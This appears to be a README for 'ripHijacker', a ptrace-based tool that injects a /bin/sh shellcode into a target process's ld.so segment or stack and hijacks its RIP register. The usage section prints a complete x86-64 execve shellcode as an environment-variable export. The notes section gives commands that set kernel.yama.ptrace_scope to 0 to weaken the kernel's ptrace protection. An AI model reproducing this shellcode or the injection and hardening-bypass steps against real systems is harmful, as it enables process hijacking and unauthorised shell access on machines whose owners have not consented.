# ripHijacker

# DESCRIPTION:

- It allows you to inject an hardcoded "/bin/sh" shellcode into the executable segment /lib/x86_64-linux-gnu/ld-2.19.so of the target process and to overwrite its $rip register with the address of that segment.
- It allows you to inject an hardcoded "/bin/sh" shellcode into the stack of the target process and to overwrite its $rip register with the address pointed by its $rsp register.                       
- It allows you to overwrite the $rip register of the target process with the address of an environment variable located in the target's stack.

## SYNOPSIS: 
```bash
$./ripHijacker [OPTIONS]
```

## OPTIONS:
```
-p <target_pid>:        pid of the target process.
-z <0|1>:               if enabled (1), it overwrites the $rip register with an address of the target's stack.
-e <env_var>:           name of the environment variable on which the $rip register will point at.
-n <target_progr_name>: name of the target.
```
(-e and -n options must be used together and only if -z is enabled)

## EXAMPLES:

```bash
 $./ripHijacker -p 6666
 ```
 
 ```bash
 $./ripHijacker -p 6666 -z 1
 ````
 
 We can load a simple /bin/sh shellcode in an environment variable with the comand:
 ```bash
 
 export A=$(python -c "print '\x90' * 20 + '\xeb\x1f\x5f\x48\x31\xc0\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05\x48\x31\xff\x48\x83\xc0\x7f\x48\x83\xc0\x2d\x0f\x05\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'")
 ```
 
Now we can use -e and -n options:

 ```bash
 $./ripHijacker -p 6666 -z 1 -e A -n target_name
```

## NOTES:
ripHijacker uses ptrace. 
```
"A PTRACE scope of "0" is the more permissive mode.  A scope of "1" limits
PTRACE only to direct child processes.."
```
So we can change scope of ptrace with these commands:
```bash
$sudo vim  /etc/sysctl.d/10-ptrace.conf
```
..and setting.. 
```bash
kernel.yama.ptrace_scope = 0
```
..after that we must load the new settings with:
```bash
$sudo sysctl --system -a -p | grep  yama
```

Obviously, to use '-z 1' option the target program must be compiled with the "-z execstack" option and to use -e and -n options the environment variable must be loaded before the program target execution.

## ACKNOWLEDGEMENT:

Vorrei ringraziare Fabio Blacklight ed il suo vecchio ma geniale programma meminj.c che mi ha permesso di venire a 
conoscenza dell'utilità di ptrace ed anche Crossbower che mi ha dato l'idea su come effettuare l'attacco ld_inj

## Video:
[![Video image](https://img.youtube.com/vi/Pi39DfYiMFQ/0.jpg)](https://www.youtube.com/watch?v=Pi39DfYiMFQ)


